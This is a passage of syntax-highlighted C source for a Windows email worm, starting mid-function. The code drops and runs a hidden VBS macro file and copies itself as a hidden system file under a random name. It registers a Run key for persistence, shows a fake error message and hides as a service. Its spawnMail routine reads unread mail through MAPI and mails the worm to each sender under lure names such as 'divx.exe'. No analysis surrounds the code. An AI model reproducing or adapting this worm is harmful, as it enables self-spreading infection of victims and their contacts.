                                                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"%c"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"\" &amp; chr$(%i)"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]);</span><span class="sc0">
                                                        </span><span class="sc11">m</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                                                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"chr$(%i)"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">[</span><span class="sc11">n</span><span class="sc10">]);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">63</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">m</span><span class="sc10">)</span><span class="sc0">
                                                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">" &amp; "</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"\"\nput #1,,b$\n"</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc11">m</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                                                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"\nput #1,,b$\n"</span><span class="sc10">);</span><span class="sc0">
                                          </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                       </span><span class="sc10">}</span><span class="sc0">
                       </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"end sub\n"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">vbsFile</span><span class="sc10">,</span><span class="sc6">"wt"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">fd</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"%s%s%s"</span><span class="sc10">,</span><span class="sc11">vbs</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc11">macrosFile</span><span class="sc10">,</span><span class="sc11">vbs</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc11">vbsFile</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_HIDE</span><span class="sc10">)&lt;</span><span class="sc4">33</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">macrosFile</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">vbsFile</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc1">/* write inside wininit.ini stuff to erase those */</span><span class="sc0">
                        </span><span class="sc1">/* two files next boot time */</span><span class="sc0">
                        </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"wt"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">fd</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"[rename]\n"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"NUL=%s\n"</span><span class="sc10">,</span><span class="sc11">vbsFile</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"NUL=%s\n"</span><span class="sc10">,</span><span class="sc11">macrosFile</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc1">/* installation stuff */</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">status</span><span class="sc10">==</span><span class="sc11">INSTALL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">status</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* use this file as lock file */</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\\binstall-lock.log"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"rt"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"wt"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc11">daemonFile</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc7">'a'</span><span class="sc10">+(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">26</span><span class="sc10">*</span><span class="sc11">rand</span><span class="sc10">()/</span><span class="sc11">RAND_MAX</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">daemonFile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_READONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
                        </span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_SYSTEM</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">" /q"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hkey</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">daemonFile</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">daemonFile</span><span class="sc10">)-</span><span class="sc4">4</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc11">daemonFile</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc1">/* stealth message will appear only with installation with zero */</span><span class="sc0">
        </span><span class="sc1">/* flags: default */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">status</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"fakedllfakedll"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">FormatMessage</span><span class="sc10">(</span><span class="sc11">FORMAT_MESSAGE_FROM_SYSTEM</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">GetLastError</span><span class="sc10">(),</span><span class="sc0">
                        </span><span class="sc11">MAKELANGID</span><span class="sc10">(</span><span class="sc11">LANG_NEUTRAL</span><span class="sc10">,</span><span class="sc11">SUBLANG_DEFAULT</span><span class="sc10">),&amp;</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONSTOP</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc1">/* at this point we are at quiet mode */</span><span class="sc0">
  </span><span class="sc1">/* try to hide current process as service */</span><span class="sc0">
  </span><span class="sc11">k32</span><span class="sc10">=</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">RegSerPro</span><span class="sc10">=(</span><span class="sc11">RSP</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">,</span><span class="sc6">"RegisterServiceProcess"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegSerPro</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">RegSerPro</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc11">spawnMail</span><span class="sc10">();</span><span class="sc0">

  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*
  Kinda rip from my BRSHWORM.
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">spawnMail</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mailto</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">MAPIdll</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MLOGON</span><span class="sc0"> </span><span class="sc11">MLogon</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MLOGOFF</span><span class="sc0"> </span><span class="sc11">MLogoff</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MSENDMAIL</span><span class="sc0"> </span><span class="sc11">MSendMail</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MFREEBUFFER</span><span class="sc0"> </span><span class="sc11">MFree</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MREADMAIL</span><span class="sc0"> </span><span class="sc11">MReadMail</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MFINDNEXT</span><span class="sc0"> </span><span class="sc11">MFindNext</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">messId</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mess</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc11">attachment</span><span class="sc10">={</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,(</span><span class="sc11">ULONG</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc0">
  </span><span class="sc10">};</span><span class="sc0">
  </span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">destination</span><span class="sc10">={</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_TO</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
  </span><span class="sc10">};</span><span class="sc0">
  </span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">mbody</span><span class="sc10">={</span><span class="sc0">
        </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_RECEIPT_REQUESTED</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc0">
  </span><span class="sc10">};</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filenames</span><span class="sc10">[]=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc6">"setup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"southpark.scr"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"movie.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"divx.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"billy.scr"</span><span class="sc10">,</span><span class="sc0">
  </span><span class="sc6">"santax.scr"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AllYouBaseBelongToUs.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wazzup.scr"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fun2u.scr"</span><span class="sc10">,</span><span class="sc0">
  </span><span class="sc6">"patch.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pr0n.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"moreWindows.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sillyPoint.exe"</span><span class="sc10">,</span><span class="sc0">
  </span><span class="sc6">"hitByTheBill.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hotHotHot.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hurryUp.scr"</span><span class="sc0">
  </span><span class="sc10">};</span><span class="sc0">

  </span><span class="sc11">attachment</span><span class="sc10">.</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">filename</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">destination</span><span class="sc10">.</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">mailto</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mbody</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">=&amp;</span><span class="sc11">destination</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mbody</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">=&amp;</span><span class="sc11">attachment</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc1">/* wait for 5 minutes */</span><span class="sc0">
  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">*</span><span class="sc4">60</span><span class="sc10">*</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc1">/* get MAPI stuff */</span><span class="sc0">
  </span><span class="sc11">MAPIdll</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MAPIdll</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">MLogon</span><span class="sc10">=(</span><span class="sc11">MLOGON</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MLogon</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">MLogoff</span><span class="sc10">=(</span><span class="sc11">MLOGOFF</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogoff"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MLogoff</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">MSendMail</span><span class="sc10">=(</span><span class="sc11">MSENDMAIL</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MSendMail</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">MFindNext</span><span class="sc10">=(</span><span class="sc11">MFINDNEXT</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFindNext"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MFindNext</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">


  </span><span class="sc11">MReadMail</span><span class="sc10">=(</span><span class="sc11">MREADMAIL</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIReadMail"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MReadMail</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">MFree</span><span class="sc10">=(</span><span class="sc11">MFREEBUFFER</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFreeBuffer"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MFree</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">MLogon</span><span class="sc10">)(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAPI_USE_DEFAULT</span><span class="sc10">,</span><span class="sc0">
     </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">session</span><span class="sc10">)!=</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc1">/* scan all unreaded messages */</span><span class="sc0">
  </span><span class="sc11">messId</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">MFindNext</span><span class="sc10">)(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">|</span><span class="sc11">MAPI_UNREAD_ONLY</span><span class="sc0">
                        </span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">MReadMail</span><span class="sc10">)(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_ENVELOPE_ONLY</span><span class="sc10">|</span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">mess</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mailto</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">attachment</span><span class="sc10">.</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc11">filenames</span><span class="sc10">[(</span><span class="sc4">16</span><span class="sc10">*</span><span class="sc11">rand</span><span class="sc10">()/</span><span class="sc11">RAND_MAX</span><span class="sc10">)];</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">mbody</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">MFree</span><span class="sc10">)(</span><span class="sc11">mess</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc10">(</span><span class="sc11">MLogoff</span><span class="sc10">)(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MAPIdll</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
